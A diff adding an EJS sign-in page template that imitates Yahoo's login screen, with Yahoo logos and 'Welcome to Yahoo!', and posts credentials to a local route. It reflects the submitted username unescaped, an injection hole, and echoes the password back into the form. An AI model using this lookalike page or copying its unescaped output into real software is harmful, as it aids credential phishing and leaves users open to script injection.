@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Sign-in</title>
+	<link rel="stylesheet" type="text/css" href="styles/auth.css">
+</head>
+
+<%
+	function showErr(errMsg) { 
+		if (errMsg !== undefined) { 
+			return `<span class="err">${errMsg}</span><br />`; 
+		} else { 
+			return ''; } 
+	} 
+%>
+
+<body>
+	<% if (msg) { %>
+	<div class="success-msg"> <%= msg %> </div>
+	<script>
+		setTimeout(function() {
+			document.querySelector('.success-msg').style.display = 'none';
+		}, 5000);
+	</script>
+	<% } %>
+	</div>
+	<div id="login-body" class="loginish puree-v2 grid">
+		<div class="mbr-desktop-hd">
+			<span class="column">
+				<a href="#">
+					<img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" height="32">
+				</a>
+			</span>
+		</div>
+		<div class="login-box-container">
+			<div class="login-box center">
+				<div class="mbr-login-hd txt-align-center">
+					<img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" height="27">
+				</div>
+				<div class="challenge yid-challenge">
+					<div class="username-challenge" id="login-landing">
+						<strong class="challenge-heading">Welcome to Yahoo!</strong>
+						<span class="challenge-desc signin-sub-title">Please login to continue.</span>
+
+						<form id="login-username-form" method="post" class="pure-form" action="/sign-in">
+							<div id="user-info-field" class="user-info">
+
+								<div class="input-group">
+									<input class="phone-no" type="text" name="username" id="login-username" value="<%- params.username ? params.username : '' %>" placeholder=" ">
+									<div class="input-field-icon hide" id="username-field-icon"></div>
+									<label for="login-username" id="login-label" class="login-label">Username</label>
+									<br>
+									<% if (error.username) { %>
+									<p class="error-msg"><%- showErr(error.username) %></p>
+									<% } %>
+								</div>
+
+								<div class="input-group">
+									<input class="phone-no" type="password" name="password" id="login-password" value="<%= params.password ? params.password : '' %>" placeholder=" ">
+									<div class="input-field-icon hide" id="pass-field-icon"></div>
+									<label for="login-password" id="login-label" class="login-label">Password</label>
+									<br>
+									<% if (error.password) { %>
+									<p class="error-msg"><%- showErr(error.password) %></p>
+									<% } %>
+								</div>
+
+							</div>
+
+							<div class="button-container">
+								<input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Login">
+								<a href="/sign-up" id="createacc" role="button" class="pure-button puree-button-secondary challenge-button">Sign up</a>
+							</div>
+						</form>
+					</div>
+				</div>
+			</div>
+		</div>
+</body>
+
+</html>
